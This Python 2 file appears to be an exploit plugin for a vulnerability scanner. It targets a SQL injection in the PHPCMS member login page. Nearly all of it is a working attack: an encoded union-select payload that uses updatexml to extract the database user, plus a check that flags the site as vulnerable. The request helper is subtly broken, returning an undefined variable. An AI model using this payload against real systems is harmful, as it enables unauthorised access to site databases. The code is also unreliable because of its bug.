# -*- coding: cp936 -*-
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
from libs.functions import *
#import modules.*


class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'Phpcms注入漏洞_login',
        'author':'demon',
        'update':'2015/10/06',
        'site':'http://www.dawner.info',
        'vuln_type':'sqlinjection',
        'vuln_source':'http://www.tang3.org/blog/2015/07/21/PHPCMS%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/'
        }
    opts  = {
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url

    def exploit(self):
        '''start exploit'''
        exp_url = self.url+'/index.php?m=member&c=index&a=login'
        value = {'username':'phpcms','password':'123456','username':'%27%20union%20select%20%272%27%2C%27test%5C%27%2Cupdatexml%281%2Cconcat%280x5e24%2C%28select%20user%28%29%29%2C0x5e24%29%2C1%29%2C%5C%27123456%5C%27%2C%5C%27%5C%27%2C%5C%27%5C%27%2C%5C%27%5C%27%2C%5C%27%5C%27%2C%5C%27%5C%27%2C%5C%272%5C%27%2C%5C%2710%5C%27%29%2C%28%5C%272%5C%27%2C%5C%27test%27%2C%275f1d7a84db00d2fce00b31a7fc73224f%27%2C%27123456%27%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23'}
        resp = self.post_url(value,exp_url).read()
        
        if '5f1d7a84db00d2fce00b31a7fc73224f' in resp :
            print '[!]Phpcms exsit sqli at member login page(PHP5.3).\n'
            print '[+]Vul_url:'+exp_url+'\n'
            exp_url =  str(exp_url)
            #return exp_url
        else:
            pass
    def post_url(self,value,exp_url):
       
        post_data=urllib.urlencode(value)

        req_resp = urllib2.urlopen(exp_url,post_data)

        return resp
